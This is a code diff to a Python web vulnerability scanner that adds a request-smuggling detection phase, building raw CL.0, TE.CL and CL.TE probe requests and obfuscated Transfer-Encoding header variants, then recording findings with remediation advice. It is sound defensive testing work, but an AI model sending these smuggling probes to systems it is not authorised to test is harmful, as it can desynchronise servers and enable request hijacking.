@@ -44,7 +44,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from pathlib import Path
 
-VERSION = "2.30.19"
+VERSION = "2.31.0"
 
 # ── Adaptive concurrency ──────────────────────────────────────────────────────
 def _hw_detect():
@@ -9519,6 +9519,7 @@ DEFAULT_SETTINGS: dict = {
             "session": False, "csrf": False, "cross_user": False,
             "logout": False,   # Phase 22: post-context logout + session lifecycle
             "open_redirect": True, "deserialization": True,
+            "request_smuggling": True,  # Phase 17b: CL.0/TE.CL/CL.TE smuggling
             "file_upload_info": True, "mass_assignment": True,
             "access_matrix":   False,  # Phase 20: multi-credential access matrix
             "bfla":            True,   # Phase 21: broken function level authorization
@@ -23164,6 +23165,659 @@ def _phase_deserialization(target: dict, cfg: dict, pm: ProgressManager,
     vc.log("[deserialization] Phase complete", "SUCCESS")
 
 
+# ─────────────────────────────────────────────
+# Phase 17b: HTTP Request Smuggling / Client-Side Desync
+# ─────────────────────────────────────────────
+# CWE-444: Inconsistent Interpretation of HTTP Requests
+# References:
+#   PortSwigger — HTTP Request Smuggling
+#   PortSwigger — Browser-Powered Desync Attacks (CSD)
+#   RFC 9112 §6.3 — Message Body Length
+
+def _phase_request_smuggling(target: dict, cfg: dict, pm: ProgressManager,
+                              out: OutputManager, sess: requests.Session,
+                              crawl_data: dict) -> None:
+    """Phase 17b: HTTP Request Smuggling and Client-Side Desync detection.
+
+    Tests for CL.0 (client-side desync), TE.CL, and CL.TE smuggling using
+    raw sockets with two-phase detection: differential timing probe, then
+    verified confirmation with a smuggled canary.
+    """
+    import socket as _sock, ssl as _ssl2, select as _sel2
+
+    phase    = "request_smuggling"
+    url      = target["url"]
+    hostname = target["hostname"]
+    port     = target["port"]
+    scheme   = target["scheme"]
+    timeout  = cfg.get("timeout", 10)
+    use_tls  = scheme == "https"
+    parsed   = urllib.parse.urlparse(url)
+    base_path = parsed.path or "/"
+
+    vc.status(phase, "Request Smuggling", "running", "Initializing", 0, 4)
+
+    # ── Helpers ───────────────────────────────────────────────────────────
+
+    def _raw_connect(connect_timeout=None):
+        ct = connect_timeout or timeout
+        sock = _sock.create_connection((hostname, port), timeout=ct)
+        sock.settimeout(None)
+        if use_tls:
+            ctx = _ssl2.create_default_context()
+            if not cfg.get("verify_ssl", False):
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl2.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=hostname)
+        return sock
+
+    def _recv(sock, max_wait=5.0):
+        """Read until headers + short body window or timeout."""
+        buf = b""
+        deadline = time.time() + max_wait
+        while time.time() < deadline:
+            rem = max(deadline - time.time(), 0.05)
+            ready = _sel2.select([sock], [], [], min(rem, 1.0))
+            if not ready[0]:
+                if buf:
+                    break
+                continue
+            try:
+                chunk = sock.recv(8192)
+            except (_sock.error, _ssl2.SSLError, OSError):
+                break
+            if not chunk:
+                break
+            buf += chunk
+            if b"\r\n\r\n" in buf:
+                _tail_deadline = time.time() + 0.5
+                while time.time() < _tail_deadline:
+                    r2 = _sel2.select([sock], [], [], 0.3)
+                    if not r2[0]:
+                        break
+                    try:
+                        c2 = sock.recv(8192)
+                    except (_sock.error, _ssl2.SSLError, OSError):
+                        break
+                    if not c2:
+                        break
+                    buf += c2
+                break
+        return buf
+
+    def _status(raw: bytes) -> int:
+        try:
+            return int(raw.split(b"\r\n")[0].split()[1])
+        except (IndexError, ValueError):
+            return 0
+
+    def _keepalive(raw: bytes) -> bool:
+        lo = raw.lower()
+        if b"connection: close" in lo:
+            return False
+        if raw.startswith(b"HTTP/1.1") or b"connection: keep-alive" in lo:
+            return True
+        return False
+
+    def _close(sock):
+        try:
+            sock.close()
+        except Exception:
+            pass
+
+    _cookies = "; ".join(f"{c.name}={c.value}" for c in sess.cookies)
+    _ck = f"Cookie: {_cookies}\r\n" if _cookies else ""
+
+    _baseline_code = 0
+    try:
+        _bl = sess.get(url, timeout=timeout, allow_redirects=False)
+        _baseline_code = _bl.status_code
+    except Exception:
+        pass
+
+    _test_paths = [base_path]
+    for _f in crawl_data.get("forms", [])[:5]:
+        _a = _f.get("action", "")
+        if _a:
+            _p = urllib.parse.urlparse(_a).path
+            if _p and _p not in _test_paths:
+                _test_paths.append(_p)
+
+    def _save_smuggle_evidence(label: str, content: str) -> str:
+        """Write evidence text; return run-dir-relative path or empty."""
+        try:
+            d = out.root / phase
+            d.mkdir(parents=True, exist_ok=True)
+            fp = d / f"{re.sub(r'[^a-zA-Z0-9_]', '_', label)[:50]}.txt"
+            fp.write_text(content)
+            return str(fp.relative_to(out.root))
+        except Exception:
+            return ""
+
+    # ── Test 1: CL.0 / Client-Side Desync ─────────────────────────────────
+    # POST with body containing a smuggled GET.  If the server responds
+    # before consuming the body and keeps the connection alive, the smuggled
+    # request may be interpreted as the next request on the connection.
+    vc.status(phase, "Request Smuggling", "running", "CL.0 client-side desync", 1, 4)
+    vc.log("[request_smuggling] Testing CL.0 / client-side desync", "INFO")
+
+    _cl0_found = False
+    _canary_tag = f"_fr_smug_{int(time.time()) % 99999}"
+    _canary_path = f"/{_canary_tag}"
+
+    for _tp in _test_paths[:4]:
+        if _cl0_found:
+            break
+        sock = None
+        try:
+            sock = _raw_connect()
+            smuggled = (
+                f"GET {_canary_path} HTTP/1.1\r\n"
+                f"Host: {hostname}\r\n"
+                f"\r\n"
+            ).encode()
+            post_hdr = (
+                f"POST {_tp} HTTP/1.1\r\n"
+                f"Host: {hostname}\r\n"
+                f"{_ck}"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: {len(smuggled)}\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+            ).encode()
+
+            # Send POST headers only — no body yet
+            sock.sendall(post_hdr)
+
+            # Wait for early response (precondition: server responds before body)
+            early = b""
+            if _sel2.select([sock], [], [], 3)[0]:
+                early = _recv(sock, max_wait=3)
+
+            if not early or b"HTTP/1." not in early or not _keepalive(early):
+                _close(sock)
+                continue
+
+            # Precondition met: send body (smuggled request)
+            try:
+                sock.sendall(smuggled)
+            except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
+                _close(sock)
+                continue
+
+            time.sleep(0.3)
+
+            # Follow-up GET on the same connection
+            followup = (
+                f"GET {base_path} HTTP/1.1\r\n"
+                f"Host: {hostname}\r\n"
+                f"{_ck}"
+                f"Connection: close\r\n"
+                f"\r\n"
+            ).encode()
+            fu_resp = b""
+            try:
+                sock.sendall(followup)
+                fu_resp = _recv(sock, max_wait=5)
+            except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
+                pass
+            _close(sock)
+            sock = None
+
+            if not fu_resp:
+                continue
+
+            fu_code = _status(fu_resp)
+            detail = ""
+            if _canary_tag.encode() in fu_resp:
+                detail = (f"Follow-up response contains smuggled canary "
+                          f"path '{_canary_path}'")
+            elif fu_code == 404 and _baseline_code and _baseline_code != 404:
+                detail = (f"Follow-up GET {base_path} → 404 "
+                          f"(expected {_baseline_code}); server processed "
+                          f"smuggled GET {_canary_path}")
+            elif fu_code == 400 and _baseline_code and _baseline_code != 400:
+                detail = (f"Follow-up GET {base_path} → 400 "
+                          f"(expected {_baseline_code}); desynchronised")
+
+            if detail:
+                _cl0_found = True
+                ev = _save_smuggle_evidence(
+                    f"cl0_{_tp}",
+                    f"=== CL.0 Client-Side Desync Evidence ===\n"
+                    f"Target path: {_tp}\n"
+                    f"Verification: {detail}\n\n"
+                    f"--- POST (headers only, no body) ---\n"
+                    f"{post_hdr.decode(errors='replace')}\n"
+                    f"--- Early response ---\n"
+                    f"{early.decode(errors='replace')[:800]}\n\n"
+                    f"--- Smuggled body ---\n"
+                    f"{smuggled.decode(errors='replace')}\n\n"
+                    f"--- Follow-up response (HTTP {fu_code}) ---\n"
+                    f"{fu_resp.decode(errors='replace')[:800]}\n")
+                out.add_finding(
+                    title="HTTP Request Smuggling — CL.0 Client-Side Desync",
+                    url=url, port=port, risk="HIGH",
+                    description=(
+                        f"A CL.0 client-side desync was confirmed at '{_tp}'. The "
+                        f"server responded to a POST before consuming the body and "
+                        f"kept the connection alive, allowing a smuggled request to "
+                        f"be interpreted as the next pipelined request. An attacker "
+                        f"can exploit this via a victim's browser to hijack "
+                        f"connections, enabling XSS, credential theft, or web cache "
+                        f"poisoning.\n\nVerification: {detail}"),
+                    output=(
+                        f"POST {_tp} → early response HTTP {_status(early)}, "
+                        f"keep-alive\n"
+                        f"Smuggled: GET {_canary_path}\n"
+                        f"Follow-up: GET {base_path} → HTTP {fu_code} "
+                        f"(expected {_baseline_code})\n{detail}"),
+                    output_file=ev,
+                    sources="fracture-smuggling", service=scheme,
+                    affected=_tp, cves="",
+                    owasp="A08:2025 Software and Data Integrity Failures",
+                    nist="SI-10",
+                    remediation=(
+                        "Ensure the server fully consumes POST request bodies "
+                        "before responding, or closes the connection after the "
+                        "response. Enable HTTP/2 end-to-end. Configure reverse "
+                        "proxies to normalise Content-Length handling and reject "
+                        "ambiguous requests."),
+                )
+                vc.log(f"[request_smuggling] CL.0 CONFIRMED at {_tp}: {detail}",
+                       "SUCCESS")
+        except Exception as _e:
+            vc.log(f"[request_smuggling] CL.0 probe error on {_tp}: {_e}",
+                   "WARNING")
+        finally:
+            if sock:
+                _close(sock)
+
+    if not _cl0_found:
+        vc.log("[request_smuggling] No CL.0 desync detected", "INFO")
+
+    # ── Test 2: TE.CL Smuggling ─────────────────────────────────────────
+    # Front-end uses Transfer-Encoding, back-end uses Content-Length.
+    # Phase A: timing probe — an incomplete chunk causes the TE side to
+    #          wait for more data (timeout), while a CL side responds fast.
+    # Phase B: smuggled prefix — leftover bytes after the CL boundary
+    #          corrupt the next request.
+    vc.status(phase, "Request Smuggling", "running", "TE.CL smuggling", 2, 4)
+    vc.log("[request_smuggling] Testing TE.CL differential", "INFO")
+
+    _tecl_found = False
+    for _tp in _test_paths[:2]:
+        if _tecl_found:
+            break
+        sock = None
+        try:
+            # Phase A: timing probe
+            sock = _raw_connect()
+            timing_req = (
+                f"POST {_tp} HTTP/1.1\r\n"
+                f"Host: {hostname}\r\n"
+                f"{_ck}"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"Content-Length: 4\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+                f"1\r\n"
+                f"Z\r\n"
+                f"Q"
+            ).encode()
+            t0 = time.time()
+            sock.sendall(timing_req)
+            timing_resp = _recv(sock, max_wait=6)
+            dt = time.time() - t0
+            _close(sock)
+            sock = None
+
+            # Quick response (< 2 s) ⇒ server used CL; slow/timeout ⇒ TE.
+            if dt < 3.0 and timing_resp:
+                vc.log(f"[request_smuggling] TE.CL timing: fast response "
+                       f"({dt:.1f}s) — server likely uses CL, not TE", "INFO")
+                continue
+
+            vc.log(f"[request_smuggling] TE.CL timing: {dt:.1f}s delay — "
+                   f"server may use TE on front-end", "INFO")
+
+            # Phase B: confirm with smuggled prefix.
+            # Body: "0\r\n\r\nG"  (6 bytes).
+            # TE parser: reads "0\r\n\r\n" → end of chunks.
+            # CL parser (CL=6): reads all 6 bytes → body done, but "G" is
+            # the 6th byte inside the body.  However, if the front-end (TE)
+            # forwarded all raw bytes to the backend (CL=6), the backend
+            # consumes "0\r\n\r\nG" as body.  The leftover starts from the
+            # follow-up.  That alone doesn't smuggle.
+            #
+            # Correct TE.CL: CL must be SHORTER than the TE body so leftovers
+            # exist after the CL boundary on the backend.
+            #   TE body: chunk "1\r\nG\r\n" + terminator "0\r\n\r\n"
+            #   CL = 3  → backend reads "1\r\n" (3 bytes), leftover = "G\r\n0\r\n\r\n"
+            sock = _raw_connect()
+            smug_body = "1\r\nG\r\n0\r\n\r\n"
+            confirm_req = (
+                f"POST {_tp} HTTP/1.1\r\n"
+                f"Host: {hostname}\r\n"
+                f"{_ck}"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"Content-Length: 3\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+                f"{smug_body}"
+            ).encode()
+            sock.sendall(confirm_req)
+            resp1 = _recv(sock, max_wait=5)
+            if resp1 and _keepalive(resp1):
+                followup = (
+                    f"GET {base_path} HTTP/1.1\r\n"
+                    f"Host: {hostname}\r\n"
+                    f"{_ck}"
+                    f"Connection: close\r\n"
+                    f"\r\n"
+                ).encode()
+                resp2 = b""
+                try:
+                    sock.sendall(followup)
+                    resp2 = _recv(sock, max_wait=5)
+                except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
+                    pass
+
+                if resp2:
+                    code2 = _status(resp2)
+                    if (code2 in (400, 405)
+                            and _baseline_code
+                            and _baseline_code not in (400, 405)):
+                        _tecl_found = True
+                        ev = _save_smuggle_evidence(
+                            f"tecl_{_tp}",
+                            f"=== TE.CL Smuggling Evidence ===\n"
+                            f"Target: {_tp}\n"
+                            f"Timing delay: {dt:.1f}s\n\n"
+                            f"--- Smuggling request ---\n"
+                            f"{confirm_req.decode(errors='replace')}\n\n"
+                            f"--- Response 1 ---\n"
+                            f"{resp1.decode(errors='replace')[:800]}\n\n"
+                            f"--- Follow-up response (HTTP {code2}) ---\n"
+                            f"{resp2.decode(errors='replace')[:800]}\n")
+                        out.add_finding(
+                            title="HTTP Request Smuggling — TE.CL Desync",
+                            url=url, port=port, risk="CRITICAL",
+                            description=(
+                                f"A TE.CL request smuggling vulnerability was confirmed "
+                                f"at '{_tp}'. The front-end processes Transfer-Encoding: "
+                                f"chunked while the back-end processes Content-Length, "
+                                f"allowing an attacker to smuggle arbitrary requests "
+                                f"through the front-end proxy. This enables request "
+                                f"hijacking, web cache poisoning, credential theft, and "
+                                f"potential RCE via chained attacks.\n\n"
+                                f"Follow-up GET {base_path} → HTTP {code2} "
+                                f"(expected {_baseline_code})."),
+                            output=(
+                                f"Timing: {dt:.1f}s (front-end uses TE)\n"
+                                f"POST {_tp} with TE + CL=3 (disagreement)\n"
+                                f"Follow-up: GET {base_path} → HTTP {code2} "
+                                f"(expected {_baseline_code})"),
+                            output_file=ev,
+                            sources="fracture-smuggling", service=scheme,
+                            affected=_tp, cves="",
+                            owasp="A08:2025 Software and Data Integrity Failures",
+                            nist="SI-10",
+                            remediation=(
+                                "Reject requests carrying both Transfer-Encoding and "
+                                "Content-Length (RFC 9112 §6.3). Enable HTTP/2 "
+                                "end-to-end. Ensure all proxy layers agree on body "
+                                "length semantics."),
+                        )
+                        vc.log(f"[request_smuggling] TE.CL CONFIRMED at {_tp}",
+                               "SUCCESS")
+            _close(sock)
+            sock = None
+        except Exception as _e:
+            vc.log(f"[request_smuggling] TE.CL error on {_tp}: {_e}", "WARNING")
+        finally:
+            if sock:
+                _close(sock)
+
+    if not _tecl_found:
+        vc.log("[request_smuggling] No TE.CL smuggling detected", "INFO")
+
+    # ── Test 3: CL.TE Smuggling ─────────────────────────────────────────
+    # Front-end uses Content-Length, back-end uses Transfer-Encoding.
+    vc.status(phase, "Request Smuggling", "running", "CL.TE smuggling", 3, 4)
+    vc.log("[request_smuggling] Testing CL.TE differential", "INFO")
+
+    _clte_found = False
+    for _tp in _test_paths[:2]:
+        if _clte_found:
+            break
+        sock = None
+        try:
+            # Phase A: timing probe.
+            # CL=0 + TE:chunked with no terminator.
+            # CL front-end reads 0 bytes → responds immediately.
+            # TE front-end waits for chunk terminator → timeout.
+            sock = _raw_connect()
+            timing_req = (
+                f"POST {_tp} HTTP/1.1\r\n"
+                f"Host: {hostname}\r\n"
+                f"{_ck}"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 0\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+            ).encode()
+            t0 = time.time()
+            sock.sendall(timing_req)
+            timing_resp = _recv(sock, max_wait=6)
+            dt = time.time() - t0
+            _close(sock)
+            sock = None
+
+            if dt > 3.0 or not timing_resp:
+                vc.log(f"[request_smuggling] CL.TE timing: slow/no response "
+                       f"({dt:.1f}s) — server likely uses TE, not CL", "INFO")
+                continue
+
+            vc.log(f"[request_smuggling] CL.TE timing: fast ({dt:.1f}s) — "
+                   f"server may use CL on front-end", "INFO")
+
+            # Phase B: CL.TE confirm.
+            # CL = total bytes of the body we actually send.
+            # The TE back-end reads chunks.  We embed a smuggled prefix
+            # inside a chunk that the CL front-end forwards blindly.
+            sock = _raw_connect()
+            smuggled_prefix = "G"
+            chunked_body = f"1\r\n{smuggled_prefix}\r\n0\r\n\r\n"
+            confirm_req = (
+                f"POST {_tp} HTTP/1.1\r\n"
+                f"Host: {hostname}\r\n"
+                f"{_ck}"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: {len(chunked_body)}\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+                f"{chunked_body}"
+            ).encode()
+            sock.sendall(confirm_req)
+            resp1 = _recv(sock, max_wait=5)
+
+            if resp1 and _keepalive(resp1):
+                followup = (
+                    f"GET {base_path} HTTP/1.1\r\n"
+                    f"Host: {hostname}\r\n"
+                    f"{_ck}"
+                    f"Connection: close\r\n"
+                    f"\r\n"
+                ).encode()
+                resp2 = b""
+                try:
+                    sock.sendall(followup)
+                    resp2 = _recv(sock, max_wait=5)
+                except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
+                    pass
+
+                if resp2:
+                    code2 = _status(resp2)
+                    if (code2 in (400, 405)
+                            and _baseline_code
+                            and _baseline_code not in (400, 405)):
+                        _clte_found = True
+                        ev = _save_smuggle_evidence(
+                            f"clte_{_tp}",
+                            f"=== CL.TE Smuggling Evidence ===\n"
+                            f"Target: {_tp}\n"
+                            f"Timing delay: {dt:.1f}s\n\n"
+                            f"--- Smuggling request ---\n"
+                            f"{confirm_req.decode(errors='replace')}\n\n"
+                            f"--- Response 1 ---\n"
+                            f"{resp1.decode(errors='replace')[:800]}\n\n"
+                            f"--- Follow-up response (HTTP {code2}) ---\n"
+                            f"{resp2.decode(errors='replace')[:800]}\n")
+                        out.add_finding(
+                            title="HTTP Request Smuggling — CL.TE Desync",
+                            url=url, port=port, risk="CRITICAL",
+                            description=(
+                                f"A CL.TE request smuggling vulnerability was confirmed "
+                                f"at '{_tp}'. The front-end processes Content-Length "
+                                f"while the back-end processes Transfer-Encoding: "
+                                f"chunked, allowing request smuggling.\n\n"
+                                f"Follow-up GET {base_path} → HTTP {code2} "
+                                f"(expected {_baseline_code})."),
+                            output=(
+                                f"Timing: {dt:.1f}s (front-end uses CL)\n"
+                                f"POST {_tp} with CL={len(chunked_body)} + TE:chunked\n"
+                                f"Follow-up: GET {base_path} → HTTP {code2} "
+                                f"(expected {_baseline_code})"),
+                            output_file=ev,
+                            sources="fracture-smuggling", service=scheme,
+                            affected=_tp, cves="",
+                            owasp="A08:2025 Software and Data Integrity Failures",
+                            nist="SI-10",
+                            remediation=(
+                                "Reject requests carrying both Transfer-Encoding and "
+                                "Content-Length. Enable HTTP/2 end-to-end. Normalise "
+                                "request processing across all proxy layers."),
+                        )
+                        vc.log(f"[request_smuggling] CL.TE CONFIRMED at {_tp}",
+                               "SUCCESS")
+            _close(sock)
+            sock = None
+        except Exception as _e:
+            vc.log(f"[request_smuggling] CL.TE error on {_tp}: {_e}", "WARNING")
+        finally:
+            if sock:
+                _close(sock)
+
+    if not _clte_found:
+        vc.log("[request_smuggling] No CL.TE smuggling detected", "INFO")
+
+    # ── Test 4: Transfer-Encoding obfuscation ─────────────────────────────
+    # Some proxies only recognise the canonical "chunked" token.  Obfuscated
+    # TE headers (extra whitespace, capitalisation, line folding) may be
+    # ignored by one layer but honoured by another, creating a differential.
+    _te_variants = (
+        "Transfer-Encoding: xchunked",
+        "Transfer-Encoding : chunked",
+        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
+        "Transfer-Encoding:\tchunked",
+        "Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
+    )
+    _te_obfusc_found = False
+    for _te_hdr in _te_variants:
+        if _te_obfusc_found:
+            break
+        sock = None
+        try:
+            sock = _raw_connect()
+            probe = (
+                f"POST {base_path} HTTP/1.1\r\n"
+                f"Host: {hostname}\r\n"
+                f"{_ck}"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 3\r\n"
+                f"{_te_hdr}\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+                f"1\r\nG\r\n0\r\n\r\n"
+            ).encode()
+            sock.sendall(probe)
+            resp1 = _recv(sock, max_wait=5)
+            if resp1 and _keepalive(resp1):
+                followup = (
+                    f"GET {base_path} HTTP/1.1\r\n"
+                    f"Host: {hostname}\r\n"
+                    f"{_ck}"
+                    f"Connection: close\r\n"
+                    f"\r\n"
+                ).encode()
+                resp2 = b""
+                try:
+                    sock.sendall(followup)
+                    resp2 = _recv(sock, max_wait=5)
+                except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
+                    pass
+                if resp2:
+                    code2 = _status(resp2)
+                    if (code2 in (400, 405)
+                            and _baseline_code
+                            and _baseline_code not in (400, 405)):
+                        _te_obfusc_found = True
+                        ev = _save_smuggle_evidence(
+                            "te_obfusc",
+                            f"=== TE Obfuscation Smuggling Evidence ===\n"
+                            f"Obfuscated header: {_te_hdr!r}\n\n"
+                            f"--- Request ---\n"
+                            f"{probe.decode(errors='replace')}\n\n"
+                            f"--- Response 1 ---\n"
+                            f"{resp1.decode(errors='replace')[:800]}\n\n"
+                            f"--- Follow-up (HTTP {code2}) ---\n"
+                            f"{resp2.decode(errors='replace')[:800]}\n")
+                        out.add_finding(
+                            title="HTTP Request Smuggling — TE Obfuscation Desync",
+                            url=url, port=port, risk="CRITICAL",
+                            description=(
+                                f"A request smuggling vulnerability was confirmed via "
+                                f"Transfer-Encoding header obfuscation. The header "
+                                f"variant {_te_hdr!r} was processed differently by the "
+                                f"front-end and back-end, creating a desync.\n\n"
+                                f"Follow-up GET {base_path} → HTTP {code2} "
+                                f"(expected {_baseline_code})."),
+                            output=(
+                                f"TE header: {_te_hdr!r}\n"
+                                f"Follow-up: GET {base_path} → HTTP {code2} "
+                                f"(expected {_baseline_code})"),
+                            output_file=ev,
+                            sources="fracture-smuggling", service=scheme,
+                            affected=base_path, cves="",
+                            owasp="A08:2025 Software and Data Integrity Failures",
+                            nist="SI-10",
+                            remediation=(
+                                "Normalise Transfer-Encoding headers at the front-end "
+                                "proxy. Reject requests with ambiguous or obfuscated "
+                                "TE headers. Enable HTTP/2 end-to-end."),
+                        )
+                        vc.log(f"[request_smuggling] TE obfuscation CONFIRMED: "
+                               f"{_te_hdr!r}", "SUCCESS")
+            _close(sock)
+            sock = None
+        except Exception:
+            pass
+        finally:
+            if sock:
+                _close(sock)
+
+    if not _te_obfusc_found:
+        vc.log("[request_smuggling] No TE obfuscation desync detected", "INFO")
+
+    vc.status(phase, "Request Smuggling", "complete", "Done", 4, 4)
+    vc.log("[request_smuggling] Phase complete", "SUCCESS")
+
+
 # =============================================================================
 # A08 Subresource Integrity check (2026-06-11 review)
 # =============================================================================
@@ -25030,7 +25684,8 @@ def main() -> None:
                     # automatic.
                     _NOISY_PHASES = (
                         "ffuf", "vulnscan", "injection", "traversal",
-                        "ssrf", "deserialization", "mass_assignment",
+                        "ssrf", "deserialization", "request_smuggling",
+                        "mass_assignment",
                         "file_upload_info", "open_redirect",
                         "business_logic", "auth_bypass", "files",
                         "subdomain_takeover",
@@ -26720,6 +27375,22 @@ def main() -> None:
                 except Exception as e:
                     vc.error(f"Phase deserialization [{_ctx_label}] error: {e}")
                     pm.set_phase_status(f"deserialization#{_ctx_label}", "error", detail=str(e))
+
+            # ── Phase 17b: request_smuggling ──
+            # Transport-layer test — only meaningful on the first (non-reduced)
+            # context since the vulnerability is independent of the auth role.
+            if not _skip("request_smuggling") and not _is_reduced_ctx:
+                pm.set_phase_status(f"request_smuggling#{_ctx_label}", "running",
+                                    "Request Smuggling")
+                try:
+                    _phase_request_smuggling(target, _ctx_cfg, pm, out,
+                                             effective_auth, crawl_data)
+                    pm.set_phase_status(f"request_smuggling#{_ctx_label}", "complete",
+                                        "Request Smuggling")
+                except Exception as e:
+                    vc.error(f"Phase request_smuggling [{_ctx_label}] error: {e}")
+                    pm.set_phase_status(f"request_smuggling#{_ctx_label}", "error",
+                                        detail=str(e))
 
             # ── Phase 18: file_upload_info ──
             if not _skip("file_upload_info"):
